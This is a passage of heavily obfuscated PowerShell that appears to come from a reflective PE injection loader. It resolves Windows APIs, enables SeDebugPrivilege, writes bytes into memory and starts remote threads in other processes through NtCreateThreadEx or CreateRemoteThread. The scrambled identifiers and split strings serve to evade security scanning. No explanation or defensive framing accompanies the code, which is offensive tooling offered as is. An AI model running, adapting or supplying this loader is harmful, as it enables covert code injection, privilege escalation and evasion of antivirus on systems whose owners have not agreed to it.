		    ${Wi`N32FuNct`i`ONs} | &("{1}{0}{2}"-f '-Me','Add','mber') -MemberType ("{0}{2}{3}{1}"-f'No','y','tePrope','rt') -Name ("{3}{0}{4}{2}{1}" -f'k','egeValue','pPrivil','Loo','u') -Value ${LookuP`Pri`V`ilEGEV`ALUE}
		
		    ${iMper`s`O`NAtesE`lFAD`DR} = &("{0}{1}{3}{2}" -f'Get-ProcAdd','r','s','es') ("{0}{2}{1}"-f 'Adva','i32.dll','p') ("{1}{0}{2}"-f 'rson','Impe','ateSelf')
            ${ImP`ERS`ONAT`Es`elfDEleGATe} = &("{2}{0}{1}" -f'gateTyp','e','Get-Dele') @([Int32]) ([Bool])
            ${Im`Per`soNA`Tese`LF} =  ${zfi`2`wh}::("{1}{4}{0}{5}{3}{2}"-f'rFunct','Get','ter','n','DelegateFo','ionPoi').Invoke(${Im`peRsO`NAT`ESELfAdDr}, ${I`mp`E`R`SONA`TEsElFdeLEGa`TE})
		    ${WI`N`3`2fUnCtI`oNS} | &("{2}{0}{1}"-f 'Me','mber','Add-') -MemberType ("{3}{2}{1}{0}"-f 'rty','pe','ePro','Not') -Name ("{0}{2}{1}"-f 'Im','nateSelf','perso') -Value ${i`mPer`s`ONatE`SELf}
		
		    ${NTcr`EAtE`TH`R`EA`DExadDR} = &("{0}{1}{2}"-f 'Get-Pr','ocAddre','ss') ("{1}{0}"-f'tDll.dll','N') ("{1}{3}{0}{2}"-f'eThrea','N','dEx','tCreat')
            ${NTcreAteT`HReadE`x`Del`EGAte} = &("{1}{0}{2}{3}" -f 'gat','Get-Dele','e','Type') @( ( &("{0}{1}"-f 'g','ci') ('vAr'+'iABl'+'E:'+'bQTA') )."vaL`UE".("{2}{3}{1}{4}{0}" -f'e','fTy','Ma','keByRe','p').Invoke(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${NtCR`eAtE`ThrEad`EX} =  ( &("{0}{1}{2}" -f 'vaRiAB','l','e')  ("{2}{0}{1}" -f'2','wH','zfI') -ValuEoN)::("{2}{6}{3}{4}{0}{1}{7}{8}{5}"-f 'a','teF','G','e','g','inter','etDel','orFu','nctionPo').Invoke(${NTCR`eATEth`Read`eXAD`dR}, ${N`T`Cre`ATetHrEAdEXD`El`e`G`ATe})
		    ${W`I`N`32FuNctiONs} | &("{0}{1}{2}" -f 'Add','-Memb','er') -MemberType ("{1}{2}{0}{3}" -f 't','NotePr','oper','y') -Name ("{1}{2}{0}{3}"-f 'ea','N','tCr','teThreadEx') -Value ${n`TCre`At`eT`HREADEX}
		
		    ${Iswow`64p`ROce`ssaddR} = &("{0}{3}{1}{2}" -f'Get-','ddr','ess','ProcA') ("{0}{1}{3}{2}"-f'K','erne','32.dll','l') ("{2}{0}{1}" -f'ow','64Process','IsW')
            ${iSW`OW64pR`Oc`E`SSdelegate} = &("{4}{5}{3}{2}{0}{1}"-f 'teT','ype','ga','le','G','et-De') @([IntPtr],  ${0`2C`Bi}.("{0}{2}{1}{3}" -f 'Mak','ByRefT','e','ype').Invoke()) ([Bool])
            ${I`sWO`W64`pR`oCESs} =   ${Zfi`2wh}::("{3}{5}{4}{1}{0}{2}" -f 'nctionPoi','u','nter','Ge','gateForF','tDele').Invoke(${i`sWo`w`64prO`CeSSADDR}, ${i`sw`OW`64`PRocesS`De`l`egAtE})
		    ${WIn32`Fun`CTI`ONs} | &("{1}{0}{2}{3}"-f 'dd-Me','A','mb','er') -MemberType ("{1}{0}{2}{3}" -f 'p','NotePro','ert','y') -Name ("{1}{0}{3}{2}"-f '6','IsWow','s','4Proces') -Value ${Isw`Ow`6`4PrO`cESS}
		
		    ${cREATETh`REa`Da`D`DR} = &("{2}{0}{3}{1}" -f'ProcA','ss','Get-','ddre') ("{3}{2}{0}{1}"-f '.','dll','32','Kernel') ("{2}{0}{1}"-f'eThrea','d','Creat')
            ${CrE`ATETHR`Ea`D`DELega`TE} = &("{0}{3}{1}{2}"-f 'Get-','t','eType','Delega') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32],   ( &("{0}{2}{1}" -f 'gE','tEm','T-i') ('vA'+'RIAB'+'Le:'+'K'+'U0C') )."vA`LUe".("{1}{0}{3}{2}{4}"-f'ef','MakeByR','yp','T','e').Invoke()) ([IntPtr])
            ${CReATe`THR`eAd} =   ${ZFi2`Wh}::("{1}{3}{2}{5}{0}{4}" -f 'oin','GetDelegate','Function','For','ter','P').Invoke(${cREatEtHRe`A`D`ADDR}, ${cr`EAteTH`R`EaddElEgaTe})
		    ${w`IN3`2`FunCt`ions} | &("{0}{2}{1}" -f 'Add-Me','er','mb') -MemberType ("{0}{2}{1}" -f 'N','perty','otePro') -Name ("{1}{2}{0}" -f 'read','C','reateTh') -Value ${c`R`EatEThR`EAD}
		
		    return ${w`in`32fUN`cT`IOns}
	    }
	    

			
	    
	    
	    

	    
	    
	    Function SUb-Si`g`NED`Int`As`UnsiG`NEd
	    {
		    Param(
		    [Parameter(poSition = 0, MaNdatOry = ${T`RuE})]
		    [Int64]
		    ${V`AlUE1},
		
		    [Parameter(POsITioN = 1, maNdatORY = ${T`RuE})]
		    [Int64]
		    ${VAl`U`e2}
		    )
		
		    [Byte[]]${VALuE`1`BYtES} =  ${Fq2`BlU}::("{0}{1}"-f'GetByte','s').Invoke(${VA`L`UE1})
		    [Byte[]]${VAL`UE2b`ytes} =  ${Fq`2B`lU}::("{0}{1}"-f'GetBy','tes').Invoke(${va`L`Ue2})
		    [Byte[]]${Fi`Nalbyt`ES} =  ${F`q2`Blu}::"GEtBy`TEs"([UInt64]0)

		    if (${VA`lu`e1BYtes}."co`UnT" -eq ${vAlu`E2`BYt`Es}."Co`Unt")
		    {
			    ${cARr`Y`oveR} = 0
			    for (${I} = 0; ${i} -lt ${vAlu`E1b`YTEs}."COU`NT"; ${i}++)
			    {
				    ${v`AL} = ${V`ALuE`1`BYtes}[${I}] - ${cARRyo`V`er}
				    
				    if (${V`Al} -lt ${VaLU`E2`B`YtEs}[${i}])
				    {
					    ${v`Al} += 256
					    ${c`ArR`yov`eR} = 1
				    }
				    else
				    {
					    ${C`ArRyo`VER} = 0
				    }
				
				
				    [UInt16]${S`UM} = ${v`Al} - ${vaL`U`e2BY`TEs}[${i}]

				    ${FI`N`Al`BYtES}[${I}] = ${s`Um} -band 0x00FF
			    }
		    }
		    else
		    {
			    Throw ("{2}{1}{6}{5}{4}{0}{8}{10}{7}{3}{9}" -f'rrays of ','ot subtr','Cann','nt','ea','ct byt','a','e','dif',' sizes','fer')
		    }
		
		    return   ${FQ`2BLu}::("{0}{1}" -f 'ToInt6','4').Invoke(${fi`NaL`ByteS}, 0)
	    }
	

	    Function aDD-si`g`NeD`intAsun`SiGN`ED
	    {
		    Param(
		    [Parameter(POSiTION = 0, mAnDAToRY = ${tr`Ue})]
		    [Int64]
		    ${V`ALUE1},
		
		    [Parameter(pOSitiON = 1, MaNdatorY = ${T`RuE})]
		    [Int64]
		    ${Va`Lue2}
		    )
		
		    [Byte[]]${vAl`Ue1`B`YTES} =   ${f`q2B`lU}::("{1}{0}{2}" -f 't','GetBy','es').Invoke(${vA`Lu`e1})
		    [Byte[]]${vAlU`e2`B`yTes} =   ${F`q2b`LU}::("{1}{0}{2}" -f 'By','Get','tes').Invoke(${va`lu`E2})
		    [Byte[]]${FiNA`Lb`Y`Tes} =   (  &("{2}{1}{0}" -f 'rIAblE','T-Va','gE')  ("{0}{1}"-f 'FQ2','blu') -ValUeo  )::"ge`TBYt`ES"([UInt64]0)

		    if (${vAL`U`e1B`YtES}."co`Unt" -eq ${vAlUE`2b`Y`TES}."c`OUnT")
		    {
			    ${cA`RR`yovER} = 0
			    for (${I} = 0; ${i} -lt ${vAl`Ue`1byt`ES}."Co`UNt"; ${I}++)
			    {
				    
				    [UInt16]${S`UM} = ${Va`lue`1b`YteS}[${i}] + ${VAlu`E2BY`Tes}[${i}] + ${CarRYo`V`eR}

				    ${F`InA`L`ByTEs}[${i}] = ${S`Um} -band 0x00FF
				
				    if ((${s`Um} -band 0xFF00) -eq 0x100)
				    {
					    ${c`Ar`RyO`VEr} = 1
				    }
				    else
				    {
					    ${caRRy`oV`ER} = 0
				    }
			    }
		    }
		    else
		    {
			    Throw ("{5}{4}{0}{6}{3}{2}{1}" -f't add bytearr','zes','nt si','f differe','anno','C','ays o')
		    }
		
		    return   ( &('lS') ("{4}{1}{2}{3}{0}" -f'Blu','Ab','le:Fq','2','VARi'))."VA`LUE"::("{0}{1}"-f 'To','Int64').Invoke(${F`inALB`y`TEs}, 0)
	    }
	

	    Function coM`p`ARE`-v`A`L`1`GrEaTeRThAN`VAL2`AsUINT
	    {
		    Param(
		    [Parameter(pOSITION = 0, manDatory = ${Tr`UE})]
		    [Int64]
		    ${va`lU`E1},
		
		    [Parameter(PoSITiON = 1, MAndAtOry = ${tR`UE})]
		    [Int64]
		    ${v`AluE2}
		    )
		
		    [Byte[]]${va`L`Ue1`BYtes} =   ${F`q`2Blu}::("{1}{0}{2}"-f't','GetBy','es').Invoke(${valU`E1})
		    [Byte[]]${V`Al`UE2`ByTES} =   ${Fq`2`BlU}::("{0}{1}" -f'G','etBytes').Invoke(${VAlU`e2})

		    if (${v`AlUE1ByT`es}."coU`NT" -eq ${VA`luE2`BYTeS}."cOU`NT")
		    {
			    for (${I} = ${V`AluE1`B`YtEs}."CO`UNt"-1; ${i} -ge 0; ${I}--)
			    {
				    if (${VALUe`1bY`TES}[${I}] -gt ${v`AL`UE2`BYTEs}[${I}])
				    {
					    return ${t`RUe}
				    }
				    elseif (${Va`lUE`1ByTES}[${i}] -lt ${VALu`E`2BY`TES}[${I}])
				    {
					    return ${fAl`sE}
				    }
			    }
		    }
		    else
		    {
			    Throw ("{1}{5}{7}{2}{3}{0}{6}{4}"-f 'ff','Cannot compare byt','o','f di','e','e array','erent siz','s ')
		    }
		
		    return ${fA`lSE}
	    }
	

	    Function CoNVe`RT-`U`iNtToInt
	    {
		    Param(
		    [Parameter(posiTION = 0, mANDatorY = ${TR`Ue})]
		    [UInt64]
		    ${Val`Ue}
		    )
		
		    [Byte[]]${ValU`eby`TeS} =   ( &("{3}{0}{2}{1}" -f 'Et-','ablE','vArI','G') ("{1}{0}" -f'2BlU','Fq') -VALUe)::("{2}{1}{0}" -f 'tes','etBy','G').Invoke(${va`l`Ue})
		    return ( (&("{0}{1}" -f'I','TEm') ('vari'+'Ab'+'L'+'E:fq2BL'+'u') )."VA`LUE"::("{0}{2}{1}"-f 'ToI','4','nt6').Invoke(${Va`LUEBy`T`ES}, 0))
	    }
	
	
	    Function tesT-MEMOry`RA`NgEvAl`Id
	    {
		    Param(
		    [Parameter(pOSItion = 0, MANDATOrY = ${t`RuE})]
		    [String]
		    ${dEb`UGSt`R`InG},
		
		    [Parameter(poSItIon = 1, maNDATory = ${T`RUe})]
		    [System.Object]
		    ${p`ein`FO},
		
		    [Parameter(PosiTiON = 2, mAnDatOrY = ${tr`UE})]
		    [IntPtr]
		    ${stAR`TAd`DR`eSS},
		
		    [Parameter(paraMEtErSeTnAME = "eND`Add`ReSs", pOsitioN = 3, maNdATorY = ${t`RuE})]
		    [IntPtr]
		    ${E`N`daddR`eSS},
		
		    [Parameter(pArameTeRSEtnaMe = "S`iZe", pOSITion = 3, maNdATOry = ${tr`UE})]
		    [IntPtr]
		    ${sI`ZE}
		    )
		
		    [IntPtr]${FiN`A`lEN`dADDr`E`SS} =  (&("{3}{2}{1}{0}" -f'bLE','A','-vARI','gET') ("{0}{1}"-f'b','QTA'))."Va`lue"::"zE`Ro"
		    if (${PSC`m`DL`et}.parametersetNAmE -eq ("{1}{0}"-f 'ize','S'))
		    {
			    [IntPtr]${fin`AL`enDad`Dre`SS} = [IntPtr](&("{2}{6}{1}{5}{3}{4}{0}"-f 'd','-Signed','A','ntAsU','nsigne','I','dd') (${sTA`RtAdd`ResS}) (${SI`ze}))
		    }
		    else
		    {
			    ${FINALEN`Da`DDR`ess} = ${E`NdAddR`ESs}
		    }
		
		    ${PeenD`A`dD`ResS} = ${pei`NFO}."EndA`d`drESS"
		
		    if ((&("{0}{1}{3}{5}{4}{2}"-f 'Compar','e-','Int','Val1G','U','reaterThanVal2As') (${PE`iN`Fo}."P`E`hANDLe") (${s`TaRtAD`D`REss})) -eq ${tr`UE})
		    {
			    Throw ('Tryi'+'ng '+'to'+' '+'wri'+'t'+'e '+'to'+' '+'m'+'emor'+'y '+'s'+'maller'+' '+'t'+'han '+'al'+'l'+'ocated '+'address'+' '+'ra'+'nge'+'. '+"$DebugString")
		    }
		    if ((&("{1}{3}{4}{0}{6}{5}{2}{7}{8}" -f'Val1G','C','2AsUI','omp','are-','l','reaterThanVa','n','t') (${FinA`LE`Nd`ADd`ReSs}) (${PEE`Nd`ADD`R`ESS})) -eq ${t`Rue})
		    {
			    Throw ('Try'+'i'+'ng '+'to'+' '+'w'+'rit'+'e '+'to'+' '+'me'+'mo'+'ry '+'grea'+'ter '+'tha'+'n '+'al'+'loc'+'ated '+'add'+'res'+'s '+'ra'+'nge'+'. '+"$DebugString")
		    }
	    }
	
	
	    Function W`Rite-bytes`ToME`MorY
	    {
		    Param(
			    [Parameter(POSITion=0, MAndAToRY = ${t`RUe})]
			    [Byte[]]
			    ${BY`T`ES},
			
			    [Parameter(PosiTiOn=1, mANDatoRY = ${Tr`UE})]
			    [IntPtr]
			    ${me`M`ORy`AddR`ESs}
		    )
	
		    for (${ofF`Set} = 0; ${ofF`set} -lt ${BY`T`Es}."LEN`G`TH"; ${ofF`sEt}++)
		    {
			     (&("{0}{1}" -f'I','tem')  ("VarIaBl"+"e:"+"ZFI"+"2WH")  )."va`luE"::"WRit`e`ByTE"(${memo`RyAdD`R`e`sS}, ${o`FF`seT}, ${BY`TeS}[${o`FFSeT}])
		    }
	    }
	

	    
	    Function GeT-`DEL`eG`AtETy`PE
	    {
	        Param
	        (
	            [OutputType([Type])]
	        
	            [Parameter( pOsItion = 0)]
	            [Type[]]
	            ${P`ArAMe`T`Ers} = (&("{1}{0}{3}{2}"-f'Ob','New-','t','jec') ("{0}{1}"-f 'Type[',']')(0)),
	        
	            [Parameter( POsitIon = 1 )]
	            [Type]
	            ${rETURnt`Y`pE} = [Void]
	        )

	        ${dOm`A`in} =   (&("{1}{3}{2}{0}"-f'e','GEt-v','IABL','Ar')  ("{0}{1}" -f'B9','2') )."v`ALue"::"C`U`Rre`NtDo`main"
	        ${d`YnA`SSE`MblY} = &("{2}{0}{1}" -f'ew-Ob','ject','N') ("{2}{1}{0}{4}{3}" -f 'ection.','tem.Refl','Sys','ssemblyName','A')(("{3}{2}{0}{1}" -f'legat','e','ctedDe','Refle'))
	        ${ASs`Embl`ybU`ild`Er} = ${DOM`A`in}.("{0}{1}{4}{3}{5}{2}"-f 'D','efin','mbly','micA','eDyna','sse').Invoke(${D`YNasSE`mB`Ly},  ${c`yuW}::"R`Un")
	        ${MOD`ULEbU`IL`dER} = ${ASS`E`mB`l`yBu`ILdEr}.("{1}{0}{3}{4}{2}"-f 'fin','De','le','eDynamic','Modu').Invoke(("{4}{2}{0}{3}{1}"-f 'oryModu','e','m','l','InMe'), ${fal`sE})
	        ${TYPEB`U`I`Lder} = ${moDu`LE`BUIlD`eR}.("{1}{2}{0}{3}"-f'eT','Def','in','ype').Invoke(("{0}{2}{4}{1}{3}" -f'M','a','y','teType','Deleg'), ("{0}{2}{6}{3}{5}{4}{7}{1}"-f 'C','lass','l','c, Sealed, An','ass, Auto','siCl','ass, Publi','C'), [System.MulticastDelegate])
	        ${coN`strUC`T`OrB`UIL`D`Er} = ${TyPe`B`UI`lDer}.("{0}{3}{1}{5}{4}{2}"-f 'D','f','eConstructor','e','n','i').Invoke(("{9}{0}{6}{7}{2}{8}{4}{3}{5}{1}"-f'Speci','blic','H','g, P','i','u','alName,',' ','ideByS','RT'),  (  &("{0}{2}{1}" -f'v','lE','ARIAb') ("{1}{0}" -f'Vdb','HU')  )."va`lue"::"sTA`NDARd", ${paR`A`mE`TErS})
	        ${ConS`TR`UctoRBUi`l`dER}.("{1}{0}{2}{4}{3}"-f 'tImplem','Se','entat','s','ionFlag').Invoke(("{0}{2}{3}{4}{1}"-f 'R','d','untim','e, Ma','nage'))
	        ${m`eth`odB`U`ILdER} = ${T`yPe`BUi`lDer}.("{0}{3}{2}{1}"-f'Def','thod','Me','ine').Invoke('Invoke', ("{6}{2}{4}{9}{7}{0}{10}{1}{8}{5}{3}"-f' ','Slot, V','c,','l',' H','tua','Publi','g,','ir','ideBySi','New'), ${RE`TUr`NtY`pe}, ${PaR`Am`e`Ters})
	        ${M`EtHODBu`i`l`der}.("{1}{2}{3}{0}"-f 'gs','SetImplem','entationFl','a').Invoke(("{3}{4}{2}{1}{0}" -f 'ed','Manag','e, ','R','untim'))
	    
	        &("{2}{0}{1}" -f'rite-Outp','ut','W') ${tYPe`BUiL`D`ER}.("{2}{0}{3}{1}"-f 'rea','eType','C','t').Invoke()
	    }


	    
	    Function G`eT-p`RocAd`dRESS
	    {
	        Param
	        (
	            [OutputType([IntPtr])]
	    
	            [Parameter( posITiOn = 0, mAndAtOrY = ${tr`Ue} )]
	            [String]
	            ${moD`ULe},
	        
	            [Parameter( poSITioN = 1, MAnDAtOry = ${T`RuE} )]
	            [String]
	            ${PROC`edU`RE}
	        )

	        
	        ${SY`st`EmAS`seMblY} =   ${B`92}::"C`UR`R`e`NTdoMain".("{2}{0}{1}" -f'tAssembl','ies','Ge').Invoke() |
	            &("{0}{2}{1}"-f 'Where-Ob','ect','j') { ${_}."glO`B`ALaSsEMbLycAC`hE" -And ${_}."lO`CAtI`on".("{0}{1}" -f'S','plit').Invoke('\\')[-1].("{0}{1}" -f'Equal','s').Invoke(("{1}{0}{2}"-f'.','System','dll')) }
	        ${U`NSafE`NATIV`Emeth`ods} = ${S`yST`emass`e`MBLy}.("{1}{0}" -f'tType','Ge').Invoke(("{1}{3}{5}{4}{6}{2}{0}" -f 'feNativeMethods','M','Unsa','icros','.W','oft','in32.'))
	        
	        ${GETmO`Dul`eh`An`DlE} = ${uNs`AfeNAti`VemetH`oDs}.("{2}{0}{1}" -f'Met','hod','Get').Invoke(("{0}{4}{2}{1}{3}"-f 'GetMod','dl','eHan','e','ul'))
	        ${gETpR`OC`A`Ddr`Ess} = ${UNs`AfENATIV`Em`E`T`hodS}.("{2}{0}{1}" -f 't','Method','Ge').Invoke(("{0}{2}{1}" -f'G','ss','etProcAddre'))
	        
	        ${K`ERN3`2hAnDLE} = ${G`ETm`od`UlEhand`Le}."i`NvoKe"(${nU`LL}, @(${mOdU`LE}))
	        ${Tm`P`Ptr} = &("{2}{0}{1}" -f'w-Obje','ct','Ne') ("{1}{2}{0}" -f 'r','In','tPt')
	        ${HanDLE`R`eF} = &("{2}{0}{1}"-f 'w','-Object','Ne') ("{10}{7}{3}{1}{11}{2}{0}{9}{8}{5}{4}{6}" -f'ropS','R','te','tem.','es.Han','ic','dleRef','ys','rv','e','S','untime.In')(${tM`Pp`TR}, ${KERn32ha`N`d`le})

	        
	        &("{0}{1}{2}"-f'Wr','ite','-Output') ${GetpR`o`cadd`ResS}."IN`VOKE"(${Nu`Ll}, @([System.Runtime.InteropServices.HandleRef]${h`ANdLE`R`EF}, ${Pr`o`CeDu`Re}))
	    }
	
	
	    Function EnABle-sEDEBu`gpRiv`i`l`Ege
	    {
		    Param(
		    [Parameter(posITION = 1, MandaTORY = ${Tr`Ue})]
		    [System.Object]
		    ${wi`N32fUn`CT`IONs},
		
		    [Parameter(pOsItioN = 2, MandATORy = ${tr`Ue})]
		    [System.Object]
		    ${WI`N`32tYPEs},
		
		    [Parameter(pOSiTIoN = 3, mAndATOry = ${t`RUE})]
		    [System.Object]
		    ${WIn32co`N`stanTs}
		    )
		
		    [IntPtr]${THRE`Adh`AndLE} = ${W`In`32`F`UnCTiOns}."GeTcURR`e`NtTh`READ"."inv`OKE"()
		    if (${Th`RE`A`dhAndLE} -eq  (  &("{0}{1}{2}"-f'VaR','I','AblE')  ("b"+"qta") )."vAl`UE"::"Z`ErO")
		    {
			    Throw ("{5}{7}{9}{4}{1}{8}{2}{6}{10}{3}{11}{0}" -f 'read','the','cu','t','to ','Unable to','r',' get the handle',' ',' ','ren',' th')
		    }
		
		    [IntPtr]${TH`Re`ADTokEN} =  (  &("{0}{1}" -f'VAR','IABLe')  ("{0}{1}" -f 'Bqt','A'))."v`ALue"::"Ze`RO"
		    [Bool]${R`Es`Ult} = ${wi`N3`2`FUncTi`OnS}."Ope`NThR`EadToKEN"."iNV`O`Ke"(${THR`eA`DhaNDlE}, ${WiN32co`N`S`TAnTS}."tOKe`N_q`UerY" -bor ${Win32`cONst`AN`TS}."toK`eN_AdjUst_`pRIv`IlE`ges", ${fAL`sE}, [Ref]${tHr`E`ADTo`KeN})
		    if (${reSU`LT} -eq ${F`ALSe})
		    {
			    ${err`o`RCode} =   (&("{0}{1}" -f'CH','ILdIteM') ("vArIaBLe:z"+"f"+"I2"+"W"+"H") )."VA`lUE"::("{0}{1}{3}{4}{2}" -f 'G','etL','r','astWin32Er','ro').Invoke()
			    if (${err`OR`cODE} -eq ${WIN32CO`NS`TANts}."eR`Ror_`N`o`_toKEn")
			    {
				    ${re`SULt} = ${W`IN32f`U`NcT`iONS}."I`mPErSONA`T`esE`lf"."In`Vo`ke"(3)
				    if (${RE`sult} -eq ${F`A`Lse})
				    {
					    Throw ("{6}{0}{7}{1}{5}{2}{4}{3}"-f'n','mp','sonate s','f','el','er','U','able to i')
				    }
				
				    ${ReS`ULt} = ${WIn3`2`F`UncT`Ions}."o`pE`NTHr`eAd`ToKEN"."inv`OKe"(${T`hR`EAdHaNdlE}, ${WI`N`32`CONsTantS}."T`oKEN_Q`UE`Ry" -bor ${WIn`32`c`ONsTANtS}."TOkeN_a`d`j`Ust_PriVi`L`EgES", ${f`Al`SE}, [Ref]${t`hRE`A`dTokEn})
				    if (${rES`U`lT} -eq ${F`AlsE})
				    {
					    Throw ("{1}{0}{2}{6}{3}{5}{4}"-f 'na','U','ble ','o OpenThreadToke','.','n','t')
				    }
			    }
			    else
			    {
				    Throw ('Unab'+'l'+'e '+'to'+' '+'Ope'+'nThr'+'ead'+'To'+'ken. '+'E'+'rror'+' '+'co'+'de'+': '+"$ErrorCode")
			    }
		    }
		
		    [IntPtr]${P`lU`Id} =   ${Z`FI2Wh}::("{3}{1}{2}{0}"-f'l','Glob','a','AllocH').Invoke( ( &("{2}{1}{0}" -f'vAriABLe','et-','g')  ("ZFi2"+"w"+"h")  -vALuEO)::"S`I`zeof"([Type]${w`iN32`T`ypES}."L`UiD"))
		    ${re`SuLt} = ${wI`N32fU`NcTiONs}."Lo`Okup`PriVIlegeVAL`UE"."i`NvoKE"(${n`Ull}, ("{3}{1}{2}{0}{4}" -f'i','P','riv','SeDebug','lege'), ${P`lu`Id})
		    if (${re`S`ULt} -eq ${FA`Lse})
		    {
			    Throw ("{8}{6}{2}{4}{9}{0}{7}{3}{5}{1}"-f'v','Value','bl','g','e ','e','a','ile','Un','to call LookupPri')
		    }

		    [UInt32]${t`OkENpR`Iv`s`Ize} =   (  &("{0}{1}{2}{3}"-f 'GET-','VA','RIABL','e')  ("{1}{2}{0}" -f'Wh','zFi','2')  -ValUeonLy )::"s`IzEOF"([Type]${WiN32`TyP`es}."TOK`eN`_pRiv`IlEGeS")
		    [IntPtr]${TOKEN`pR`IVI`l`egesmEM} =   (  &("{2}{1}{0}"-f 'IAble','R','vA') ("{0}{1}" -f 'Zfi2','WH') -vALUEONLy  )::("{1}{2}{0}" -f 'al','Alloc','HGlob').Invoke(${TOK`ENp`RIvS`IZE})
		    ${toKen`P`Ri`VIL`eges} =   (&("{1}{0}" -f'ci','g')  ("{3}{4}{2}{1}{0}"-f'H','i2w','iAble:zF','Va','R') )."Va`luE"::"Ptr`TOstR`Uc`Ture"(${tOk`ENPri`VIL`eG`Esm`Em}, [Type]${w`in32Ty`P`ES}."tOkE`N_p`RivIl`e`geS")
		    ${tOKE`NPriVI`L`Eges}."p`RiVILEG`e`coUNt" = 1
		    ${TOke`Np`R`iVIleGeS}."p`Ri`ViLE`Ges"."Lu`iD" =   ${z`FI2`wh}::"P`TR`TOstrUct`Ure"(${pl`U`ID}, [Type]${win`3`2`TYpEs}."l`UId")
		    ${tO`K`En`p`RivILegEs}."pRIviL`EG`Es"."attr`Ibu`TEs" = ${w`iN`32cO`NSTA`Nts}."sE_P`RivIle`ge_eNaBL`ED"
		     ( &("{1}{3}{2}{0}"-f 'ArIABlE','G','t-V','E') ("{0}{1}"-f 'zF','I2wH'))."VA`lUE"::("{2}{3}{1}{0}" -f 'tr','P','Struct','ureTo').Invoke(${tOKeNP`R`IvILegeS}, ${tok`enP`RI`VILeg`eSM`em}, ${T`RuE})

		    ${r`EsuLt} = ${WIn3`2`FUnCt`I`ONS}."aDJuST`TokeNpR`iVIL`EGES"."I`NvokE"(${thR`E`ADTok`En}, ${F`AlSE}, ${t`o`ken`PRivILEgESm`eM}, ${ToKE`NpR`ivSi`ze},  (  &("{1}{3}{2}{0}" -f'vArIAbLe','g','-','eT')  ("bQT"+"a")  )."v`ALUE"::"ZE`RO",   (&("{2}{3}{1}{0}" -f 'le','RiaB','GET','-va')  ("{1}{0}" -f'QTa','b') -valueO  )::"ZE`RO")
		    ${err`o`R`coDE} =   ${Zf`I2`Wh}::("{4}{2}{0}{1}{3}" -f'tWin','32Err','etLas','or','G').Invoke() 
		    if ((${re`sult} -eq ${f`AL`se}) -or (${e`R`ROrcoDE} -ne 0))
		    {
			    
		    }
		
		     ( &("{0}{1}" -f'di','r')  ('vAriA'+'BLE:'+'zF'+'i2wh') )."VAl`UE"::("{0}{1}{2}{3}"-f 'Fre','eHGl','ob','al').Invoke(${T`OKenpr`Iv`ileGESmEm})
	    }
	
	
	    Function in`VOkE`-cr`e`A`TereMOte`ThR`EAD
	    {
		    Param(
		    [Parameter(pOSItiON = 1, mAndAtOrY = ${t`RUE})]
		    [IntPtr]
		    ${prO`ceSsh`AN`dLe},
		
		    [Parameter(POSItion = 2, MandAtorY = ${T`RUE})]
		    [IntPtr]
		    ${stARt`A`Dd`RESs},
		
		    [Parameter(positiON = 3, mandaTory = ${F`AL`se})]
		    [IntPtr]
		    ${a`RGumen`TptR} =   (&('Ls') ('vA'+'riaB'+'LE'+':bQTa') )."V`ALUE"::"z`eRO",
		
		    [Parameter(posiTion = 4, MANdaToRy = ${tr`UE})]
		    [System.Object]
		    ${w`iN32FUNc`TI`oNS}
		    )
		
		    [IntPtr]${rem`OT`eThRe`A`dhANdLe} =   (  &("{0}{1}{2}" -f 'gE','t-vA','rIAbLe') ('bqT'+'a')  -vAlU )::"ZE`Ro"
		
		    ${O`sV`eRsion} =   ( &("{1}{0}" -f'M','iTe')  ("vaRIable"+":1c"+"t"+"i8"+"5") )."va`luE"::"OSv`ERsI`ON"."VE`RSI`oN"
		    
		    if ((${oS`V`ErsIOn} -ge (&("{1}{0}{2}"-f 'w','Ne','-Object') ("{1}{0}" -f'sion','Ver') 6,0)) -and (${Os`V`ERSi`on} -lt (&("{2}{1}{3}{0}"-f 'bject','ew-','N','O') ("{0}{1}{2}"-f 'Ve','rsi','on') 6,2)))
		    {
			    &("{1}{0}{2}" -f 'erb','Write-V','ose') ('Windo'+'ws'+' '+'Vista/7'+' '+'d'+'e'+'tected, '+'using'+' '+'NtCrea'+'teThre'+'adEx.'+' '+'A'+'d'+'dress '+'o'+'f '+'thread'+':'+' '+"$StartAddress")
			    ${ret`VaL}= ${w`in32FUNc`T`i`oNs}."NtcreateThrE`AD`eX"."InVo`kE"([Ref]${REm`o`TE`T`HreaDhan`DlE}, 0x1FFFFF,   ( &("{1}{2}{0}"-f 'tEM','GeT','-i')  ("vA"+"RiABle:"+"B"+"q"+"tA")  )."val`Ue"::"z`eRO", ${P`R`OcEs`sHANDLE}, ${sT`A`RtaddrEss}, ${aRGuMe`NT`ptr}, ${F`Al`se}, 0, 0xffff, 0xffff,   (  &("{1}{0}" -f'i','GC') ("VAri"+"a"+"ble:B"+"qt"+"A")  )."VA`lue"::"Ze`RO")
			    ${lASt`E`RRoR} =   ( &("{2}{1}{0}" -f 'T-ChILdiTEM','e','G')  ("{3}{0}{2}{1}{4}" -f'AB','E:ZF','L','varI','i2Wh')  )."Va`lUe"::("{3}{2}{0}{1}" -f 'o','r','Win32Err','GetLast').Invoke()
			    if (${remoTetHR`EaD`H`ANd`le} -eq  (&("{2}{3}{0}{1}" -f'B','Le','G','eT-vAria')  ("{0}{1}"-f 'BQ','tA') -VaLuEoNL)::"z`Ero")
			    {
				    Throw ('Error'+' '+'in'+' '+'NtCreat'+'eT'+'h'+'readEx. '+'R'+'et'+'urn '+'val'+'u'+'e: '+"$RetVal. "+'LastErr'+'or'+': '+"$LastError")
			    }
		    }
		    
		    else
		    {
			    &("{0}{1}{3}{2}"-f 'Write','-V','bose','er') ('Wi'+'n'+'dows '+'XP'+'/8 '+'det'+'ected,'+' '+'u'+'s'+'ing '+'Cr'+'eate'+'Remo'+'teThread. '+'Addr'+'ess '+'of'+' '+'thre'+'ad:'+' '+"$StartAddress")
			    ${rem`o`TeT`hRea`DHaNd`LE} = ${w`In32F`UnCtIONs}."cREATeRe`MOTeT`h`ReAD"."I`NVoke"(${pROC`e`s`SHa`NdlE},   (  &("{0}{2}{3}{1}"-f'GeT','HiLDitEm','-','c')  ("vA"+"riABLe:"+"b"+"QTA"))."VAl`UE"::"ze`RO", [UIntPtr][UInt64]0xFFFF, ${sT`ArTADdrE`SS}, ${AR`guM`ENtPTr}, 0,  ${B`qTA}::"ze`Ro")
		    }
		
